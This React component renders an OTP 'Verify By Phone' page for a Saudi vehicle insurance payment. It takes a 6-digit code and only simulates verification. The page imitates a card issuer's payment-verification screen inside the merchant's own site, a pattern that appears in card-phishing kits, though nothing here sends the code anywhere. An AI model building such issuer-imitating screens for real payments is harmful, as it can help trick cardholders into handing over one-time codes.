import { useState } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
import { ArrowRight, Shield } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import Footer from "@/components/Footer";

const OtpVerification = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  
  const companyName = searchParams.get("company") || "";
  const price = searchParams.get("price") || "0";
  const cardLast4 = searchParams.get("cardLast4") || "";

  const [otp, setOtp] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (otp.length !== 6) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رمز التحقق المكون من 6 أرقام",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);
    
    // Simulate OTP verification
    setTimeout(() => {
      setIsLoading(false);
      toast({
        title: "تم التحقق بنجاح",
        description: "تم إتمام عملية الدفع بنجاح",
      });
      // Here you would navigate to a success page
      // navigate("/payment-success");
    }, 1500);
  };

  const handleResendCode = () => {
    toast({
      title: "تم إعادة الإرسال",
      description: "تم إرسال رمز تحقق جديد إلى هاتفك",
    });
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-background to-muted/20" dir="rtl">
      {/* Header */}
      <div className="bg-gradient-to-b from-primary to-primary-dark py-8">
        <div className="container mx-auto px-4">
          <Button
            variant="ghost"
            onClick={() => navigate(-1)}
            className="text-white hover:bg-white/10 mb-4"
          >
            <ArrowRight className="ml-2" />
            العودة
          </Button>
          <div className="flex items-center justify-center gap-3">
            <Shield className="w-8 h-8 text-white" />
            <h1 className="text-2xl font-bold text-white text-center">
              تحقق آمن
            </h1>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-12">
        <div className="max-w-lg mx-auto">
          <div className="bg-white rounded-2xl shadow-lg p-8">
            <h2 className="text-2xl font-bold text-center text-foreground mb-4">
              Verify By Phone
            </h2>
            
            <p className="text-center text-muted-foreground mb-6 leading-relaxed">
              We have sent you a text message with a code to your registered mobile number.
            </p>

            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-8 text-center">
              <p className="text-sm text-blue-900">
                You are paying the amount of{" "}
                <span className="font-bold">
                  {companyName} - تأمين على المركبات ضد الغير
                </span>
              </p>
              <p className="text-lg font-bold text-blue-900 mt-2">
                SAR {price} on {new Date().toLocaleString('en-GB', { 
                  day: '2-digit', 
                  month: '2-digit', 
                  year: 'numeric',
                  hour: '2-digit',
                  minute: '2-digit',
                  second: '2-digit',
                  hour12: false
                })}
              </p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-3">
                <label className="block text-sm font-medium text-foreground text-right">
                  Verification code
                </label>
                <div className="flex justify-center" dir="ltr">
                  <InputOTP
                    maxLength={6}
                    value={otp}
                    onChange={(value) => setOtp(value)}
                  >
                    <InputOTPGroup>
                      <InputOTPSlot index={0} />
                      <InputOTPSlot index={1} />
                      <InputOTPSlot index={2} />
                      <InputOTPSlot index={3} />
                      <InputOTPSlot index={4} />
                      <InputOTPSlot index={5} />
                    </InputOTPGroup>
                  </InputOTP>
                </div>
              </div>

              <Button
                type="submit"
                className="w-full h-12 text-lg bg-blue-500 hover:bg-blue-600"
                disabled={isLoading || otp.length !== 6}
              >
                {isLoading ? "جاري التحقق..." : "CONFIRM"}
              </Button>

              <div className="text-center">
                <button
                  type="button"
                  onClick={handleResendCode}
                  className="text-blue-600 hover:text-blue-700 font-medium text-sm underline"
                >
                  RESEND CODE
                </button>
              </div>
            </form>

            <div className="mt-8 pt-6 border-t border-border space-y-3">
              <button className="w-full text-right text-sm text-blue-600 hover:text-blue-700 flex items-center justify-end gap-2">
                <span>Learn more about authentication</span>
                <span>+</span>
              </button>
              <button className="w-full text-right text-sm text-blue-600 hover:text-blue-700 flex items-center justify-end gap-2">
                <span>Need some help ?</span>
                <span>+</span>
              </button>
            </div>
          </div>
        </div>
      </div>

      <Footer />
    </div>
  );
};

export default OtpVerification;
